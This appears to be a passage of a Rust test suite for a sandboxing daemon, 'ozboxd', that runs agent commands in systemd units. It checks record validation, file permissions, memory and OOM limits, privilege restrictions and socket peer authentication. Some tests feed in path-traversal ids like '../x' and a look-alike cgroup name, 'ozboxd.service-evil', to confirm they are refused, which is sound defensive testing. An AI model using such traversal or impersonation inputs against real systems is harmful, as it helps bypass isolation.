    assert!(bad(&|v| v["program"] = "/bin/sh".into()));
    assert!(bad(&|v| v["cpu_weight"] = 0.into()));
    assert!(bad(&|v| v["cap_sha256"] = "zz".into()));
    assert!(bad(&|v| v["id"] = "../x".into()));
    assert!(RunRecord::parse(b"not json").is_err());
    assert!(RunRecord::parse(b"{}").is_err());
}

#[test]
fn a_shim_will_not_serve_a_record_that_is_not_the_one_its_unit_was_started_for() {
    let rig = Rig::new();
    let id = start_waiting_run(&rig);
    let dir = rig.runs_dir().join(&id);
    let err = run_shim::serve(&dir, &id, &"0".repeat(64)).unwrap_err();
    assert!(err.contains("not the one"), "{err}");
    let hash = sha256_hex(&fs::read(dir.join("run.json")).unwrap());
    let err = run_shim::serve(&dir, "other", &hash).unwrap_err();
    assert!(err.contains("another run"), "{err}");
}

#[test]
fn a_shim_that_is_newer_than_this_daemon_is_reported_not_driven() {
    // the daemon's handle refuses a protocol it does not know rather than guess
    assert!(run_shim::SUPPORTED_PROTOS.contains(&run_shim::PROTO));
    assert!(!run_shim::SUPPORTED_PROTOS.contains(&(run_shim::PROTO + 1)));
}

#[test]
fn the_socket_and_the_folder_are_the_box_users_alone() {
    let rig = Rig::new();
    let id = start_waiting_run(&rig);
    let dir = rig.runs_dir().join(&id);
    let mode = |p: &Path| fs::metadata(p).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode(&dir), 0o700);
    assert_eq!(mode(&dir.join("run.json")), 0o600);
    assert_eq!(mode(&dir.join("io.sock")), 0o600);
}

#[test]
fn forgetting_a_run_removes_its_folder_with_its_output() {
    let rig = Rig::new();
    let sp = rig.spawner();
    let mut a = rig.daemon();
    let (id, _) = a
        .start(RunRequest::new(argv(&["sh", "-c", "echo x"])))
        .unwrap();
    until("ends", || {
        a.tick();
        a.list().iter().any(|r| r.state == RunState::Exited)
    });
    assert!(rig.runs_dir().join(&id).exists());
    sp.forget(&id);
    assert!(!rig.runs_dir().join(&id).exists());
    // an id that is not plain is not a path
    sp.forget("../..");
    assert!(rig.runs_dir().exists());
}

/// Benchmark note (owner rule, 2026-11-12): the time from asking for a run to its first output is on the `exec` path of
/// every agent command. This measures it for the old way (a cgroup scope and a gated `sh`) and the new (a record, a shim
/// and a socket handshake), with the manager faked, so the cost of `systemd-run` itself is NOT in the unit figure: that
/// part has to be measured on a real box. Run with `cargo test -p ozboxd --test run_units exec_overhead -- --ignored
/// --nocapture`.
#[test]
#[ignore = "a measurement, not a check"]
fn exec_overhead_old_way_and_new_way() {
    fn median(mut v: Vec<Duration>) -> Duration {
        v.sort();
        v[v.len() / 2]
    }
    const N: usize = 40;
    let first_output = |m: &mut RunManager| -> Duration {
        let t = Instant::now();
        let (id, _) = m
            .start(RunRequest::new(argv(&["/bin/echo", "hello"])))
            .unwrap();
        loop {
            m.tick();
            let c = m.read_log(&id, 0).unwrap();
            if c.text.contains("hello") {
                return t.elapsed();
            }
            std::thread::sleep(Duration::from_micros(200));
        }
    };
    let dir = tempfile::tempdir().unwrap();
    let mut old = RunManager::new(
        RunConfig::default(),
        Arc::new(FakeCgroup::default()),
        Arc::new(FakeMemory::new(16 * GIB, 8 * GIB)),
        Arc::new(ozboxd::runs::StdSpawner {
            log_dir: Some(dir.path().to_path_buf()),
            log_max_bytes: 1 << 20,
        }),
        Arc::new(ozboxd::timeutil::SystemClock),
    );
    let rig = Rig::new();
    let mut new = RunManager::new(
        RunConfig::default(),
        Arc::new(FakeCgroup::default()),
        Arc::new(FakeMemory::new(16 * GIB, 8 * GIB)),
        Arc::new(UnitSpawner::new(
            UnitSpawnerConfig::new(rig.runs_dir(), "/usr/local/bin/ozboxd"),
            rig.units.clone(),
            Arc::new(ozboxd::timeutil::SystemClock),
        )),
        Arc::new(ozboxd::timeutil::SystemClock),
    );
    first_output(&mut old);
    first_output(&mut new);
    let o = median((0..N).map(|_| first_output(&mut old)).collect());
    let n = median((0..N).map(|_| first_output(&mut new)).collect());
    println!("first output, median of {N}: old (cgroup scope + gated sh) {o:?}, new (record + shim, manager faked) {n:?}");
}

// ---- the memory guard's protections on the unit path (ADR 0045) ------------------------------------------------

/// The four things the memory guard gives a run, read off a unit's start: the cap with its throttle, the bounded swap, the
/// group kill, and the raised OOM score. A start that lacks any one of them is the 2026-11-13 incident again.
fn protections(s: &UnitStart) -> [bool; 4] {
    let args = systemd_run_args(s);
    let has = |p: &str| args.iter().any(|a| a.starts_with(p));
    [
        has("--property=MemoryMax=") && has("--property=MemoryHigh="),
        has("--property=MemorySwapMax="),
        args.iter().any(|a| a == "--property=OOMPolicy=kill"),
        args.iter().any(|a| a == "--property=OOMScoreAdjust=500"),
    ]
}

fn unit_manager(rig: &Rig, cfg: RunConfig, total: u64) -> RunManager {
    RunManager::new(
        cfg,
        Arc::new(FakeCgroup::default()),
        Arc::new(FakeMemory::new(total, total)),
        Arc::new(rig.spawner()),
        rig.clock.clone(),
    )
}

#[test]
fn a_run_with_no_limit_of_its_own_gets_all_four_protections_on_the_unit_path() {
    use ozbox_core::memory_plan::sizing;
    let rig = Rig::new();
    let mut m = unit_manager(&rig, RunConfig::default(), 16 * GIB);
    let mut rq = RunRequest::new(argv(&["sh", "-c", "exit 0"]));
    rq.memory_request_bytes = GIB;
    let (id, _) = m.start(rq).unwrap();
    let want = sizing(16 * GIB);
    let s = rig.units.started.lock().unwrap()[0].clone();
    assert_eq!(s.unit, unit_name(&id));
    assert_eq!(s.memory_max, Some(want.run_max_bytes));
    assert_eq!(s.memory_high, Some(want.run_high_bytes));
    assert_eq!(s.memory_swap_max, Some(want.run_swap_max_bytes));
    assert!(s.oom_group);
    assert_eq!(s.oom_score_adj, ozbox_core::memory_plan::RUN_OOM_SCORE_ADJ);
    assert_eq!(protections(&s), [true; 4]);
    // the record shows the cap the run really has, not the absent request
    assert_eq!(
        m.list()
            .iter()
            .find(|i| i.id == id)
            .unwrap()
            .memory_max_bytes,
        Some(want.run_max_bytes)
    );
}

#[test]
fn a_protection_missing_from_a_unit_start_is_seen_by_the_check() {
    let rig = Rig::new();
    let mut m = unit_manager(&rig, RunConfig::default(), 16 * GIB);
    m.start(RunRequest::new(argv(&["sh", "-c", "exit 0"])))
        .unwrap();
    let full = rig.units.started.lock().unwrap()[0].clone();
    assert_eq!(protections(&full), [true; 4]);
    for (i, strip) in [
        |s: &mut UnitStart| {
            s.memory_max = None;
            s.memory_high = None;
        },
        |s: &mut UnitStart| s.memory_swap_max = None,
        |s: &mut UnitStart| s.oom_group = false,
        |s: &mut UnitStart| s.oom_score_adj = 0,
    ]
    .iter()
    .enumerate()
    {
        let mut s = full.clone();
        strip(&mut s);
        let got = protections(&s);
        assert!(!got[i], "protection {i} should read as missing: {got:?}");
    }
}

#[test]
fn a_requests_own_cap_is_kept_and_the_swap_share_never_exceeds_it_on_the_unit_path() {
    let rig = Rig::new();
    let mut m = unit_manager(&rig, RunConfig::default(), 16 * GIB);
    let mut rq = RunRequest::new(argv(&["sh", "-c", "exit 0"]));
    rq.memory_max_bytes = Some(2 * GIB);
    m.start(rq).unwrap();
    let s = rig.units.started.lock().unwrap()[0].clone();
    assert_eq!(s.memory_max, Some(2 * GIB));
    assert_eq!(s.memory_swap_max, Some(2 * GIB));
    assert_eq!(protections(&s), [true; 4]);
}

#[test]
fn a_box_that_chose_to_run_uncapped_still_raises_the_runs_oom_score_on_the_unit_path() {
    let rig = Rig::new();
    let mut m = unit_manager(
        &rig,
        RunConfig {
            default_memory_cap: false,
            ..RunConfig::default()
        },
        16 * GIB,
    );
    m.start(RunRequest::new(argv(&["sh", "-c", "exit 0"])))
        .unwrap();
    let s = rig.units.started.lock().unwrap()[0].clone();
    assert_eq!(protections(&s), [false, false, false, true]);
}

#[test]
fn both_backends_are_handed_the_very_same_plan() {
    use ozboxd::runs::{scope_name, testing::FakeSpawner};
    let mk = |rq: &RunRequest| {
        let rig = Rig::new();
        let mut unit = unit_manager(&rig, RunConfig::default(), 16 * GIB);
        unit.start(rq.clone()).unwrap();
        let s = rig.units.started.lock().unwrap()[0].clone();
        let cg = Arc::new(FakeCgroup::default());
        let sp = Arc::new(FakeSpawner::default());
        let mut scope = RunManager::new(
            RunConfig::default(),
            cg.clone(),
            Arc::new(FakeMemory::new(16 * GIB, 16 * GIB)),
            sp.clone(),
            rig.clock.clone(),
        );
        let (sid, _) = scope.start(rq.clone()).unwrap();
        let n = scope_name(&sid);
        // what the cgroup scope was given, file by file, equals what the unit was started with
        let num = |f: &str| cg.get(&n, f).and_then(|v| v.parse::<u64>().ok());
        assert_eq!(num("memory.max"), s.memory_max);
        assert_eq!(num("memory.high"), s.memory_high);
        assert_eq!(num("memory.swap.max"), s.memory_swap_max);
        assert_eq!(
            cg.get(&n, "memory.oom.group").as_deref() == Some("1"),
            s.oom_group
        );
        let seen = sp.limits_seen.lock().unwrap()[0].1;
        assert_eq!(seen.oom_score_adj, s.oom_score_adj);
        assert_eq!(protections(&s), [true; 4]);
    };
    let mut plain = RunRequest::new(argv(&["sh", "-c", "exit 0"]));
    plain.memory_request_bytes = GIB;
    mk(&plain);
    let mut own = plain.clone();
    own.memory_max_bytes = Some(3 * GIB);
    mk(&own);
    let mut big = plain;
    big.memory_request_bytes = 15 * GIB;
    mk(&big);
}

// ---- review round: Z9 (marker), Z10, Z11, Z12, Z13, Z15, Z18 ------------------------------------------------------------

#[test]
fn a_run_that_never_started_is_cancelled_and_one_that_lost_its_status_is_killed() {
    let rig = Rig::new();
    let mut a = rig.daemon();
    let (id, _) = a
        .start(RunRequest::new(argv(&["sh", "-c", "exit 0"])))
        .unwrap();
    drop(a);
    until("the unit ends", || rig.units.live_units().is_empty());
    let dir = rig.runs_dir().join(&id);
    assert_eq!(fs::read(dir.join("started")).unwrap(), b"started");
    fs::remove_file(dir.join("exit")).unwrap();
    // a status lost with the machine, after the unit had started: killed with it (137)
    let mut b = rig.daemon();
    b.adopt_existing();
    let info = b.list().into_iter().find(|r| r.id == id).unwrap();
    assert_eq!((info.state, info.exit_code), (RunState::Exited, Some(137)));
    // the daemon stopped between writing the record and starting the unit: it never ran, so it was not killed
    // the marker written before the manager was handed the unit says "starting": still never ran
    fs::write(dir.join("started"), b"starting").unwrap();
    let mut c = rig.daemon();
    c.adopt_existing();
    let info = c.list().into_iter().find(|r| r.id == id).unwrap();
    assert_eq!((info.state, info.exit_code), (RunState::Cancelled, None));
}

#[test]
fn a_record_and_a_status_are_written_whole_and_leave_no_temporary_file() {
    let rig = Rig::new();
    let mut a = rig.daemon();
    let (id, _) = a
        .start(RunRequest::new(argv(&["sh", "-c", "exit 0"])))
        .unwrap();
    until("the status is written", || {
        run_shim::read_exit(&rig.runs_dir().join(&id)).is_some()
    });
    let names: Vec<String> = fs::read_dir(rig.runs_dir().join(&id))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    assert!(names.iter().all(|n| !n.ends_with(".tmp")), "{names:?}");
    assert!(names.contains(&"run.json".to_string()) && names.contains(&"exit".to_string()));
    // the helper replaces a file in one step, whatever was there
    let d = tempfile::tempdir().unwrap();
    run_shim::write_atomic(d.path(), "f", b"one", 0o600).unwrap();
    run_shim::write_atomic(d.path(), "f", b"two", 0o600).unwrap();
    assert_eq!(fs::read(d.path().join("f")).unwrap(), b"two");
    assert_eq!(
        fs::metadata(d.path().join("f"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777,
        0o600
    );
}

#[test]
fn a_record_one_version_ahead_is_read_for_what_is_known_and_older_or_newer_ones_are_not() {
    let rec = RunRecord {
        v: 1,
        shim_proto: 1,
        id: "ab12".into(),
        unit: unit_name("ab12"),
        program: "sh".into(),
        labels: BTreeMap::new(),
        memory_request_bytes: 0,
        memory_max_bytes: None,
        cpu_weight: None,
        max_runtime_s: None,
        queued_ms: 1,
        started_ms: 2,
        keep_stdin_open: false,
        log_max_bytes: 1024,
        cap_sha256: None,
        daemon_cgroup: None,
    };
    let with = |f: &dyn Fn(&mut serde_json::Value)| {
        let mut v: serde_json::Value = serde_json::to_value(&rec).unwrap();
        f(&mut v);
        RunRecord::parse(v.to_string().as_bytes())
    };
    // the version written: an unknown field is refused
    assert!(with(&|v| v["future"] = 1.into()).is_err());
    // one ahead: the fields it knows are read, the rest ignored
    let r = with(&|v| {
        v["v"] = 2.into();
        v["future"] = serde_json::json!({"a": 1});
    })
    .unwrap();
    assert_eq!(r.id, "ab12");
    // two ahead, or no version, is not read
    assert!(with(&|v| v["v"] = 3.into()).is_err());
    assert!(with(&|v| v["v"] = 0.into()).is_err());
}

#[test]
fn a_units_own_time_limit_is_a_backstop_a_day_past_the_daemons_deadline() {
    let rig = Rig::new();
    let mut m = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "exit 0"]));
    rq.max_runtime_s = Some(600);
    m.start(rq).unwrap();
    let s = rig.units.started.lock().unwrap()[0].clone();
    assert_eq!(
        s.runtime_max_s,
        Some(600 + ozboxd::run_units::RUNTIME_MAX_MARGIN_S)
    );
    assert!(s.runtime_max_s.unwrap() > 600 + 3600);
}

fn start_of(sandbox: ozboxd::run_units::Sandbox) -> UnitStart {
    UnitStart {
        unit: "ozbox-run-a1.service".into(),
        exe: "/usr/local/bin/ozboxd".into(),
        args: argv(&["run-shim", "a1", "ff", "/work/.ozbox/runs"]),
        memory_max: None,
        memory_high: None,
        memory_swap_max: None,
        oom_group: false,
        oom_score_adj: 500,
        cpu_weight: 100,
        runtime_max_s: None,
        sandbox,
    }
}

#[test]
fn a_run_keeps_the_daemons_privilege_limits_and_the_strict_sandbox_is_opt_in() {
    let basic = systemd_run_args(&start_of(Default::default()));
    for p in [
        "NoNewPrivileges=yes",
        "RestrictSUIDSGID=yes",
        "LockPersonality=yes",
    ] {
        assert!(basic.contains(&format!("--property={p}")), "{p}");
    }
    assert!(!basic
        .iter()
        .any(|a| a.contains("ProtectSystem") || a.contains("PrivateDevices")));
    let strict = systemd_run_args(&start_of(ozboxd::run_units::Sandbox {
        strict: true,
        read_write_paths: vec!["/work".into(), "/tmp".into()],
    }));
    for p in [
        "PrivateDevices=yes",
        "ProtectSystem=strict",
        "ProtectHome=read-only",
        "ReadWritePaths=/work /tmp",
    ] {
        assert!(strict.contains(&format!("--property={p}")), "{p}");
    }
    // everything before the program is a property of the unit: nothing the sandbox adds can follow the `--`
    let dash = strict.iter().position(|a| a == "--").unwrap();
    assert!(strict[dash + 1..]
        .iter()
        .all(|a| !a.starts_with("--property")));
}

#[test]
fn a_runs_folder_with_whitespace_in_its_path_is_refused_up_front() {
    let rig = Rig::new();
    let cfg = UnitSpawnerConfig::new(rig.dir.path().join("my runs"), "/usr/local/bin/ozboxd");
    let sp = UnitSpawner::new(cfg, rig.units.clone(), rig.clock.clone());
    assert_eq!(
        sp.prepare().unwrap_err().kind(),
        io::ErrorKind::InvalidInput
    );
    assert!(sp.prepare().unwrap_err().to_string().contains("whitespace"));
}

#[test]
fn the_cgroup_a_peer_must_be_in_is_the_services_own_and_nothing_that_only_looks_like_it() {
    use ozboxd::run_shim::{cgroup_is_within, service_cgroup_of};
    assert_eq!(
        service_cgroup_of("/system.slice/ozboxd.service/daemon").as_deref(),
        Some("/system.slice/ozboxd.service")
    );
    assert_eq!(
        service_cgroup_of("/system.slice/ozboxd.service").as_deref(),
        Some("/system.slice/ozboxd.service")
    );
    assert_eq!(
        service_cgroup_of("/user.slice/user-1500.slice/session-3.scope"),
        None
    );
    assert_eq!(service_cgroup_of("/a/../ozboxd.service"), None);
    let svc = "/system.slice/ozboxd.service";
    assert!(cgroup_is_within("0::/system.slice/ozboxd.service\n", svc));
    assert!(cgroup_is_within(
        "0::/system.slice/ozboxd.service/daemon\n",
        svc
    ));
    // an agent's shell, another service, a name that merely starts the same, a cgroup v1 line, and nothing at all
    assert!(!cgroup_is_within(
        "0::/user.slice/user-1500.slice/session-3.scope\n",
        svc
    ));
    assert!(!cgroup_is_within(
        "0::/system.slice/ozboxd.service-evil.service\n",
        svc
    ));
    assert!(!cgroup_is_within("0::/system.slice/ozboxd.servic\n", svc));
    assert!(!cgroup_is_within(
        "12:memory:/system.slice/ozboxd.service\n",
        svc
    ));
    assert!(!cgroup_is_within("", svc));
}

#[test]
fn the_shims_peer_check_admits_everything_under_the_service_and_the_limit_is_pinned() {
    use ozboxd::run_shim::cgroup_is_within;
    let svc = "/system.slice/ozboxd.service";
    // the limit, pinned: the daemon's leaf and a run in a cgroup scope (and so a dashboard terminal) are admitted
    assert!(cgroup_is_within(
        "0::/system.slice/ozboxd.service/daemon\n",
        svc
    ));
    assert!(cgroup_is_within(
        "0::/system.slice/ozboxd.service/run-x.scope\n",
        svc
    ));
    // what is outside the service is refused, however close the name
    assert!(!cgroup_is_within(
        "0::/user.slice/user-1500.slice/user@1500.service/app.slice/x.service\n",
        svc
    ));
    assert!(!cgroup_is_within(
        "0::/system.slice/ozboxd.service-evil\n",
        svc
    ));
}

#[test]
fn a_shim_that_names_a_cgroup_refuses_a_start_from_anyone_outside_it() {
    let rig = Rig::new();
    let mut cfg = UnitSpawnerConfig::new(rig.runs_dir(), "/usr/local/bin/ozboxd");
    cfg.start_timeout = Duration::from_secs(3);
    cfg.daemon_cgroup = Some("/system.slice/not-this-daemon.service".into());
    let mut m = RunManager::new(
        RunConfig::default(),
        Arc::new(FakeCgroup::default()),
        Arc::new(FakeMemory::new(16 * GIB, 8 * GIB)),
        Arc::new(UnitSpawner::new(cfg, rig.units.clone(), rig.clock.clone())),
        rig.clock.clone(),
    );
    // this test process is not in that cgroup (and where the kernel cannot say, the shim refuses): the start is refused, and
    // the run's folder is cleaned up
    let Err(err) = m.start(RunRequest::new(argv(&["sh", "-c", "echo secret"]))) else {
        panic!("the start must be refused");
    };
    assert!(err.to_string().contains("spawn"), "{err}");
    assert_eq!(fs::read_dir(rig.runs_dir()).unwrap().count(), 0);
}

/// Linux only: the kernel names the process on the other end of a socket. A socket answered by a process that is not the
/// manager's main process for the unit gets nothing sent to it, and the run is not started.
#[cfg(target_os = "linux")]
#[test]
fn a_socket_answered_by_a_process_that_is_not_the_units_main_process_gets_nothing() {
    let rig = Rig::new();
    *rig.units.main_pid.lock().unwrap() = Some(1);
    let mut m = rig.daemon();
    let Err(err) = m.start(RunRequest::new(argv(&["sh", "-c", "echo secret"]))) else {
        panic!("the start must be refused");
    };
    assert!(err.to_string().contains("permission denied"), "{err}");
    assert_eq!(fs::read_dir(rig.runs_dir()).unwrap().count(), 0);
}

// ---- review round 3: Z21, Z22, Z23 ----------------------------------------------------------------------------------------

/// Linux only for the parts that need the kernel's report of who is on the other end of a socket (elsewhere there is no
/// peer to check, and a test that needs one has nothing to say).
fn linux_only() -> bool {
    cfg!(target_os = "linux")
}

#[test]
fn a_manager_that_cannot_yet_name_the_main_process_is_waited_for_and_nothing_is_sent_meanwhile() {
    if !linux_only() {
        return;
    }
    let rig = Rig::new();
    rig.units.main_pid_unknown.store(true, Ordering::SeqCst);
    let units = rig.units.clone();
    let flip = std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(300));
        units.main_pid_unknown.store(false, Ordering::SeqCst);
    });
    let mut m = rig.daemon();
    let t = Instant::now();
    let (_, st) = m
        .start(RunRequest::new(argv(&["sh", "-c", "exit 0"])))
        .unwrap();
    flip.join().unwrap();
    assert_eq!(st, RunState::Running);
    assert!(
        t.elapsed() >= Duration::from_millis(250),
        "{:?}",
        t.elapsed()
    );
}

#[test]
fn a_manager_that_never_names_the_main_process_gets_no_start_sent() {
    if !linux_only() {
        return;
    }
    let rig = Rig::new();
    rig.units.main_pid_unknown.store(true, Ordering::SeqCst);
    let mut cfg = UnitSpawnerConfig::new(rig.runs_dir(), "/usr/local/bin/ozboxd");
    cfg.start_timeout = Duration::from_secs(1);
    let mut m = RunManager::new(
        RunConfig::default(),
        Arc::new(FakeCgroup::default()),
        Arc::new(FakeMemory::new(16 * GIB, 8 * GIB)),
        Arc::new(UnitSpawner::new(cfg, rig.units.clone(), rig.clock.clone())),
        rig.clock.clone(),
    );
    assert!(m
        .start(RunRequest::new(argv(&["sh", "-c", "echo secret"])))
        .is_err());
    assert_eq!(fs::read_dir(rig.runs_dir()).unwrap().count(), 0);
}

#[test]
fn a_run_taken_over_while_frozen_has_its_first_answer_checked_against_the_managers_main_process() {
    if !linux_only() {
        return;
    }
    let rig = Rig::new();
    let mut a = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    let (id, _) = a.start(rq).unwrap();
    a.pause(PauseKind::Freeze);
    drop(a);
    // the new daemon cannot ask the manager for the main process while it takes the run over: it is adopted with nobody pinned
    rig.units.main_pid_unknown.store(true, Ordering::SeqCst);
    let mut b = rig.daemon();
    assert_eq!(b.adopt_existing().adopted, 1);
    assert!(b.is_frozen(&id));
    rig.units.main_pid_unknown.store(false, Ordering::SeqCst);
    // a process that is not the unit's main process answering is refused, not believed because nothing was pinned
    *rig.units.main_pid.lock().unwrap() = Some(1);
    assert!(b.send_stdin(&id, "x", false).is_err());
    // the real one is accepted (and is the one every later request is checked against)
    *rig.units.main_pid.lock().unwrap() = None;
    b.send_stdin(&id, "x", false).unwrap();
}

#[test]
fn a_unit_without_oom_group_is_told_to_continue_after_one_kill_not_to_stop() {
    let mut s = start_of(Default::default());
    assert!(!s.oom_group);
    let a = systemd_run_args(&s);
    assert!(
        a.contains(&"--property=OOMPolicy=continue".to_string()),
        "{a:?}"
    );
    assert!(!a.contains(&"--property=OOMPolicy=kill".to_string()));
    s.oom_group = true;
    let a = systemd_run_args(&s);
    assert!(a.contains(&"--property=OOMPolicy=kill".to_string()));
    assert!(!a.contains(&"--property=OOMPolicy=continue".to_string()));
}

#[test]
fn a_run_with_a_marker_that_says_starting_whose_unit_is_there_is_marked_started_by_the_daemon_that_takes_it_over(
) {
    let rig = Rig::new();
    let mut a = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    let (id, _) = a.start(rq).unwrap();
    let marker = rig.runs_dir().join(&id).join("started");
    assert_eq!(fs::read(&marker).unwrap(), b"started");
    // the daemon stopped between the shim's answer and the marker
    fs::write(&marker, b"starting").unwrap();
    drop(a);
    let mut b = rig.daemon();
    assert_eq!(b.adopt_existing().adopted, 1);
    assert_eq!(fs::read(&marker).unwrap(), b"started");
}
